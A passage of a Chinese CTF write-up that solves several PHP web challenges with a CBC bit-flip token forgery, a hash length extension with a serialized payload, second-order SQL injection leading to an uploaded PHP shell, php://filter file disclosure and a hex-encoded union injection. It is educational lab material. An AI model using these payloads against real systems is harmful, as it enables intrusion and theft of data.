GetPassword()</span><br></pre></td></tr></table></figure>
+<p>得到一个MD5值解密之后得到flag</p>
+<h3 id="神秘的令牌"><a href="#神秘的令牌" class="headerlink" title="神秘的令牌"></a>神秘的令牌</h3><p>这个题目扫一下目录可以发现index.php~，然后里面有源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;config.php&apos;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &quot;this_is_key_you_do_not_know&quot;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_token()&#123;</span><br><span class="line">    $random_token=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_token.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_identity()</span><br><span class="line">&#123;</span><br><span class="line">    global $defaultId;</span><br><span class="line">    $j = $defaultId;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($j, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[&apos;id&apos;] = base64_encode($c);</span><br><span class="line">    setcookie(&quot;ID&quot;, base64_encode($c));</span><br><span class="line">    setcookie(&quot;token&quot;, base64_encode($token));</span><br><span class="line">    if ($j === &apos;admin&apos;) &#123;</span><br><span class="line">        $_SESSION[&apos;isadmin&apos;] = true;</span><br><span class="line">    &#125; else $_SESSION[&apos;isadmin&apos;] = false;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_identity()</span><br><span class="line">&#123;</span><br><span class="line">    if (!isset($_COOKIE[&quot;token&quot;]))</span><br><span class="line">        return array();</span><br><span class="line">    if (isset($_SESSION[&apos;id&apos;])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[&apos;id&apos;]);</span><br><span class="line">        if ($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_COOKIE[&quot;token&quot;]))) &#123;</span><br><span class="line">            if ($u === &apos;admin&apos;) &#123;</span><br><span class="line">                $_SESSION[&apos;isadmin&apos;] = true;</span><br><span class="line">            &#125; else $_SESSION[&apos;isadmin&apos;] = false;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($encrypted_pass, $pass)</span><br><span class="line">&#123;</span><br><span class="line">    $encrypted_pass = base64_decode($encrypted_pass);</span><br><span class="line">    $iv = substr($encrypted_pass, 0, 16);</span><br><span class="line">    $cipher = substr($encrypted_pass, 16);</span><br><span class="line">    $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    return $password == $pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function need_login($message = NULL) &#123;</span><br><span class="line">    echo &quot;   &lt;!doctype html&gt;</span><br><span class="line">        &lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">        &lt;meta charset=\&quot;UTF-8\&quot;&gt;</span><br><span class="line">        &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">        &lt;link rel=\&quot;stylesheet\&quot; href=\&quot;CSS/target.css\&quot;&gt;</span><br><span class="line">            &lt;script src=\&quot;https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;body&gt;&quot;;</span><br><span class="line">    if (isset($message)) &#123;</span><br><span class="line">        echo &quot;  &lt;div&gt;&quot; . $message . &quot;&lt;/div&gt;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;form method=\&quot;POST\&quot; action=&apos;&apos;&gt;</span><br><span class="line">            &lt;div class=\&quot;body\&quot;&gt;&lt;/div&gt;</span><br><span class="line">                &lt;div class=\&quot;grad\&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=\&quot;header\&quot;&gt;</span><br><span class="line">                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;br&gt;</span><br><span class="line">                    &lt;div class=\&quot;login\&quot;&gt;</span><br><span class="line">                        &lt;input type=\&quot;text\&quot; placeholder=\&quot;username\&quot; name=\&quot;username\&quot;&gt;</span><br><span class="line">                        &lt;input type=\&quot;password\&quot; placeholder=\&quot;password\&quot; name=\&quot;password\&quot;&gt;               </span><br><span class="line">                        &lt;input type=\&quot;submit\&quot; value=\&quot;Login\&quot;&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                     &lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage() &#123;</span><br><span class="line">    echo &quot;&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&quot;;</span><br><span class="line">    global $flag;</span><br><span class="line">    printf(&quot;Hello ~~~ ctfer! &quot;);</span><br><span class="line">    if ($_SESSION[&quot;isadmin&quot;])</span><br><span class="line">        echo $flag;</span><br><span class="line">    echo &quot;&lt;div&gt;&lt;a href=\&quot;logout.php\&quot;&gt;Log out&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) &#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    $query = &quot;SELECT username, encrypted_pass from users WHERE username=&apos;$username&apos;&quot;;</span><br><span class="line">    $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . &quot;[$query]&quot;);</span><br><span class="line">    if ($row = $res-&gt;fetch_assoc()) &#123;</span><br><span class="line">        $uname = $row[&apos;username&apos;];</span><br><span class="line">        $encrypted_pass = $row[&quot;encrypted_pass&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if ($row &amp;&amp; login($encrypted_pass, $password)) &#123;</span><br><span class="line">        echo &quot;you are in!&quot; . &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        get_identity();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;login failed!&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">        need_login(&quot;Login Failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    test_identity();</span><br><span class="line">    if (isset($_SESSION[&quot;id&quot;])) &#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        need_login();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>全局搜索之后发现出现flag的地方，然后开始反推，从代码里面可以推出几点</p>
+<ol>
+<li>要想出现flag，必须得满足test_identity()然后继续推有，<code>u == admin--&gt;$_SESSION[&#39;isadmin&#39;] = true--&gt;get_identity()--&gt;get_random_token()--&gt; if ($j === &#39;admin&#39;) { $_SESSION[&#39;isadmin&#39;] = true;} --&gt; login()</code>，最后发现password == $pass</li>
+<li>对密文c要进行一次openssl_decrypt，用的method是CBC，才能出来结果，这里就要运用到一个叫padding oracle的攻击方法，这里的IV值是<code>base64_decode($_COOKIE[&quot;token&quot;])</code>，而c是<code>$_SESSION[&#39;id&#39;]</code></li>
+<li>登录的时候password需要一个绕过，因为存在<code>==</code>的符号，不难让人想到可以绕过</li>
+</ol>
+<p>padding oracle的攻击方法是针对CBC链接模式的的攻击，跟使用的加解密算法无关，CBC模式在服务器端如何做处理呢？先检查密码是否可以解密，如果可以就会返回解密结果和一个正确的标记值，否则就直接一个错误的标志。这就可以利用报错的特点去挖掘此处的漏洞，有点像盲注，我么可控的输入是需要解密的密文还有IV值。</p>
+<p>这个题目重点在于构造defaultID等于admin加密后的东西，如何实现？token可以伪造原因是可以绕过登录不需要重新建立一个ID，所以重点也在伪造token上，因为defaultID = 中间值^token， 构造token’ = token^defaultID^’admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b’，然后最终相当于中间值^token^defaultID^’admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b’ = defaultID^defaultID^’admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b’ =   ‘admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b’，最后完成构造。</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kG1ZE4.png" alt="kG1ZE4.png"></p>
+<h3 id="蓝鲸相册系统"><a href="#蓝鲸相册系统" class="headerlink" title="蓝鲸相册系统"></a>蓝鲸相册系统</h3><p>这个题目考察的点比较多，但有点意思，先考察了代码审计，然后就是hash长度拓展攻击，然后就是一个反序列化以及SQL注入</p>
+<p>首先在common.php中发现任意的变量覆盖，这里就是为什么后面可以随便传参的原因</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">"_POST"</span>,<span class="string">"_GET"</span>,<span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key)&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($v))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现这里面有好几条SQL语句不存在单引号，因此不管存不存在addlashes都会对此语句没有任何保护，所以这里是第二个利用点。里面的$id是一个可控点，但前提得在数据库里面找不到userid的数据才行，才可以给它赋值，但网页存在功能可以把他给删除掉，，但是这些功能还是得先登录才行，满足session[login] == 1的条件。</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kG8Vh9.png" alt="kG8Vh9.png"></p>
+<p>接着在api.php同样发现一个没有附初始值的变量$api，这个变量前面还有unserialize这很明显就是一个反序列化的漏洞，但这个时候我们想要调用里面的do_method还必须满足check函数里面的<code>$this-&gt;check === md5($result[&#39;salt&#39;] . $this-&gt;data . $username)</code>这个条件，这个也很熟悉了，hash长度拓展攻击的结构，我们可以构造一下成为admin</p>
+<p>此时我们需要的是salt的MD5，我们可以在forgot.php里面找到其hash值，让他返回url</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGGkKP.png" alt="kGGkKP.png"></p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGGZVS.png" alt="kGGZVS.png"></p>
+<p>开始构造拓展admin</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGGM2n.png" alt="kGGM2n.png"></p>
+<p>然后开始构造反序列化,但是我们还需要userid，在哪里可以得到自己的id值呢？可以在index.php里面可以发现，登陆成功以后我们可以在cookie里面发现自己的id</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGGLGj.png" alt="kGGLGj.png"></p>
+<p>然后开始构造反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">var</span> $check= <span class="string">"4af6ae895d65fe450ff1e9531e0579d2"</span>;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">"\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00"</span>;</span><br><span class="line">    <span class="keyword">var</span> $method=<span class="string">"del_user"</span>;   <span class="comment">//要调用的函数</span></span><br><span class="line">    <span class="keyword">var</span> $userid=<span class="string">"70"</span>;  <span class="comment">//要删除的用户</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> admin();</span><br><span class="line">$api = base64_encode(serialize($a));</span><br><span class="line"><span class="keyword">echo</span> $api;</span><br></pre></td></tr></table></figure>
+<p>但是想要跳转到api.php这个页面的时候就会发现还是会跳转到riji.php，查看源码可以得知这里面存在对于session[login]的检测只要另起一个浏览器再访问api.php就可以。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    header(<span class="string">'Location:/web/riji.php'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把我原来的id给删除这样就可以对我的id参数随心所欲了</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGJLTO.png" alt="kGJLTO.png"></p>
+<p>返回到原来的页面直接注入获得flag</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYVhQ.png" alt="kGYVhQ.png"></p>
+<h3 id="蓝鲸文件管理系统"><a href="#蓝鲸文件管理系统" class="headerlink" title="蓝鲸文件管理系统"></a>蓝鲸文件管理系统</h3><p>这是一道代码审计的题目，这应该是我第一次看这种整站的代码，说实话一开始只看到上传页面的时候脑子一直在想应该是上传漏洞，可能是各种截断之类的然后getshell，但后来看了下源代码发现不行，所以也只能一步步来了</p>
+<p>对于我这种小白，第一次做这样的代码审计只能先从整体结构分析开始，也就是先对网站结构进行审计，按照网站逻辑去看代码，有全局配置文件如(config.php, common.inc.php之类的)就先看一下。</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGY3AU.png" alt="kGY3AU.png"></p>
+<p>从网站结构看上传，改名，删除是网站的主要功能，所以我们主要看这三块功能，但是我们发现有全局配置文件common.inc.php，那我们就先查看它</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYIUS.png" alt="kGYIUS.png"></p>
+<p>可以看到这个全局配置文件里面对全局变量进行了转义，相当于PDO里面的magic_qutoe，一般来讲在全局设置了转义就很难存在注入的漏洞,而且不存在其他数字型的注入</p>
+<p>再来看upload.php</p>
+<p>第一段代码我们可以看得到代码文件后缀名进行了过滤，而且是白名单过滤，这样就又少了利用的可能了，而且这里是把文件名跟后缀名分开存储的</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYo4g.png" alt="kGYo4g.png"></p>
+<p>这里的filename是不带后缀名的，extension是后缀名</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYH3j.png" alt="kGYH3j.png"></p>
+<p>这部分是在数据库中插入一条新文件记录，试着上传一个文件，他在数据库的存储情况是这样的</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYbgs.png" alt="kGYbgs.png"></p>
+<p>所以还是没找到可利用的点，在查看rename.php，发现</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYqvn.png" alt="kGYqvn.png"></p>
+<p>这里有一个点就是oldname 文件名来自数据库，而newname 的文件名来自用户输入，而来自数据库里面的数据是不带转义符号的，这就存在一个二次注入，我们可以利用oldname去闭合构造语句，使后缀名为空，构造一个这样的语句<code>update `file` set filename=34.jpg,oldname=’’,extension=’’,filename=’34.jpg’ where `fid`=fid;</code></p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYOuq.png" alt="kGYOuq.png"></p>
+<p>我们就可以先上传一个文件名为’,extension=’’,filename=’34.jpg.jpg的文件，为什么要两次.jpg?</p>
+<p>因为在下面这段代码中他会自动给文件名加上后缀，这个后缀不加的话，我们在后面的二次命名会不统一，例如我们若上传了文件名为’,extension=’’,filename=’34.jpg的文件的话输入的oldname跟newname分别为’,extension=’’,filename=’34和34.php但是改名后文件系统下为34.php.jpg还是不可执行的。就是说现在改名后在文件目录下的文件是34.jpg.jpg</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYjbV.png" alt="kGYjbV.png"></p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGYxET.png" alt="kGYxET.png"></p>
+<p>上面的问题我们可以再次上传一个34.jpg文件使得文件目下存在34.jpg，后面就可以利用extension为空，文件名为34.jpg的文件变成34.php </p>
+<p><img src="C:\Users\Vinson Chan\AppData\Roaming\Typora\typora-user-images\1549181047549.png" alt="1549181047549"></p>
+<p>其实我们就是利用这两行数据，特别注意的是我们改名的时候填的是文件名而不包括后缀名的。再一次改名，找到的是fid为3的这条数据,然后拼接上空后缀名，刚好是文件系统里面的34.jpg，而这个34.jpg就是我们刚才上传的木马文件里面的内容是<code>&lt;? phpinfo(); ?&gt;</code>，打开34.php,直接getshell</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGtS5F.png" alt="kGtS5F.png"></p>
+<p>其实文件目录下34.jpg.jpg还在，真正有价值的是第二次上传的文件，第一次上传的文件只为了构造空后缀名。</p>
+<p>这个题目还是很好的，在过滤比较完善的情况下，这一种bypass思路值得学习，从源码审计-&gt;文件上传-&gt;二次注入-&gt;文件名修改漏洞利用，这一套下来对我这种小白来讲学到的太多了。</p>
+<h3 id="蓝鲸笔记系统"><a href="#蓝鲸笔记系统" class="headerlink" title="蓝鲸笔记系统"></a>蓝鲸笔记系统</h3><p>刚开始拿到这个题目的时候，一看到时登录框，就以为是SQL约束攻击或者是SQL注入，但是SQL注入没有任何回显，只能尝试SQL约束，发现确实有这个漏洞，但登陆进去之后，发现有提示/dbinit.sql，打开发现是数据库创建的代码，发现有flag字段</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGsYXF.png" alt="kGsYXF.png"></p>
+<p>但是没有任何利用价值，看了塔主的解析后，才发现原来url有问题，所以我们不能一直盯着一处漏洞一直不放手，有时候换个角度或许就有结果了。我们发现url是动态的，首页是这样的 : <code>index.php?action=front&amp;mode=index</code>，新建笔记页面是这样的:<code>index.php?action=front&amp;mode=newnote</code>，删除笔记页面是这样的: <code>index.php?action=front&amp;mode=delete&amp;id=4&amp;TOKEN=hhhhhhwhhhhhhwhw</code></p>
+<p> 于是猜测有文件包含漏洞，也就是我们所说的LFI漏洞</p>
+<p>直接访问front/index.php得到</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGsU0J.png" alt="kGsU0J.png"></p>
+<p>不允许访问说明这个页面是存在的，猜测后台为include($action.’/’.$mode.’.php’)</p>
+<p>因为这里php版本大于5.3，不能用00截断了，但是我们可以利用php伪协议把他们读出来构造202.98.28.108:10013/7sghfe673jd3/index.php?action=php://filter/read=convert.base64-encode/resource=.&amp;mode=index</p>
+<p>得到base64编码后的源码，见源代码一开始存在addslashes过滤，所以我们可以知道我们利用注入的漏洞去解决这一道题的方法不太可行<br>解码后发现文件中还包含了common.php同样的办法得到common.php的源代码，common.php的源代码里面还包含了一个config.inc.php，但是拖不出来<br>到这里就没有啥头绪了，只能回去看一下有什么可以了利用的，突然发现那个删不掉的记录提到administrator猜测可能存在后台于是拿出御剑扫描一波后台<br>发现admin目录下面的几个文件</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIs3Q.png" alt="kGIs3Q.png"></p>
+<p>于是同样的方法把这几个文件的源码给弄出来<br>进入后台admin登录页面，用户名被锁定，应该这就是那一个admin的登录页面了<br>审计一下这个页面的源码<br>我们看到admin/login.php前面有uname还有password但是这个password不知道，我们只能看到下面登录以后的set_login函数，进去函数的定义里面看一下</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIRH0.png" alt="kGIRH0.png"></p>
+<p>发现如果不存在登录信息的话，userid和level都会置空，这就可以绕过admin/index.php里面的这个判断，因为null！=false=&gt;true </p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIfEV.png" alt="kGIfEV.png"></p>
+<p>而且set_login还会发送cookie，所以我们还要构造cookie，而且cookie的的格式是admin|md5(SECURITY_KEY+’admin’)</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIhNT.png" alt="kGIhNT.png"></p>
+<p>而且security_key还有token没有设置，就会用rand函数生成随机数，这里的源代码使用wh中的6位随机排列，我们选择爆破(这里本来是推算随机数，不过这个bug好像在php中被修复了，出题人也很仁慈得把初始的随机数表变成了“wh”减少了难度。直接爆破就可以了)</p>
+<p>然后我们分别改变cookie的UID和PHPSESSID，进入index页面就进入了admin管理页面，点击那一个20条笔记发现存在一个名字叫setpagenum的页面，于是我们用同样的办法把他的源码给提取出来</p>
+<p>发现里面的page参数经过is_numeric的函数的检测，但是我们知道这个函数可以用十六进制绕过，这里应该是为了过滤进入到数据库page表里面的数据为数字</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIXE6.png" alt="kGIXE6.png"></p>
+<p>看一下index页面的展示数据库内容的语句，追踪get_page_size()函数</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGIzCD.png" alt="kGIzCD.png"></p>
+<p>发现里面的num参数本应该是数字，相当于setpagenum页面的page参数，因为mysql_fetch_assoc() 函数从结果集中取得一行作为关联数组，返回了setpagenum页面在数据库更新的num参数，但发现数据库里面的类型跟他不一致啊，数据库里面是字符串类型的，这就有一个漏洞的利用方向了。</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGo9vd.png" alt="kGo9vd.png"></p>
+<p>于是我们构造语句</p>
+<p>这里构造四列是因为在hint里面发现的SQL语句note有四列，回显的是第二列，把他编辑成16进制得到0x3120756e696f6e2073656c65637420312c666c61672c332c342066726f6d20666c616773，输入到设置条数里面，得到flag</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGoiDI.png" alt="kGoiDI.png"></p>
+<p>这一个题目用到了源码审计，PHP伪协议，二次注入还有伪随机数，学到了很多</p>
+<h3 id="蓝鲸相册展览"><a href="#蓝鲸相册展览" class="headerlink" title="蓝鲸相册展览"></a>蓝鲸相册展览</h3><p>知识点 注入绕过str_replace 注入下载文件 union盲注 phar绕过后缀名解析</p>
+<p>打开网站后发现是一个登录页面，吸收了前几次的经验，进来先不要看到有登录界面就一直往注入方向去想，打开源代码后发现存在注册页面的提示，于是我们就先去注册页面注册个账号进去看一下这个网站有什么功能。</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGowrR.png" alt="kGowrR.png"></p>
+<p>先注册一个账号，登陆进去之后发现有三个功能</p>
+<p>主页，下载，上传，我们重点看下载跟上传功能，看这个url，file=xxx,感觉存在文件包含漏洞，尝试用php伪协议把源码给拖出来。发现被拒绝了，于是我们再来看一下上传功能，发现只能上传图片，上传后它会在download处回显，在download处点击收藏会把文件下载下来。先尝试一波文件截断的处理操作，抓包改文件名，上传还是不行，因为关键的文件路径不知道</p>
+<p>只能另寻别路了，下载一张图片，抓包，发现下面的信息</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGofsA.png" alt="kGofsA.png"></p>
+<p>这个下载似乎是利用image这个标签在数据库寻找下载然后下载的，我们尝试一下能否注入，输入单引号会出现警告，直觉感觉过滤做得很严，于是尝试双写绕过利用再加上union select hex(文件名去下载源码)，不过得先让前面的搜索id不能是个可以找得到的id号，不然会一直下载自己上传的那一个文件</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGohqI.png" alt="kGohqI.png"></p>
+<p>得到index.php的源码，发现里面还有config.php，同样的方法把他给下载下来，同理我们把各个模块的源代码给下载下来</p>
+<p>首先查看全局配置文件config.php，我们发现里面确实用了addslashes函数去过滤，所以说这就减少了注入的可能性了，再来看看下面还有个filter函数这个函数就是为什么刚才可以用双写绕过的原因，因为他没有设置第四个参数，默认就会替换一次，从而双写绕过，而我们在PHP里面还有一个str_ireplace的函数对大小写极不敏感，可以用大小写绕过。</p>
+<p>我们在upload.php里面的发现文件上传规则，只允许上传图片</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGo5Zt.png" alt="kGo5Zt.png"></p>
+<p>下面就是文件命名规则</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGoIdP.png" alt="kGoIdP.png"></p>
+<p>发现里面有一个随机数命名，查看此函数位于config.php里面</p>
+<p><img src="C:\Users\Vinson Chan\AppData\Roaming\Typora\typora-user-images\1549204940505.png" alt="1549204940505"></p>
+<p><img src="file:///C:/Users/VINSON~1/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" alt="img"></p>
+<p>生成的是32位的随机数，可能就存在随机数的漏洞，我们使用union盲注的方法把文件路径给跑出来得到文件路径名</p>
+<p>用脚本去利用union盲注跑文件名，重要的是如何双写绕过，因为这里面download.php的功能只有在登陆以后才可以实现，所以，我们必须的带cookie跑，我下面就是我的request请求要发送的内容</p>
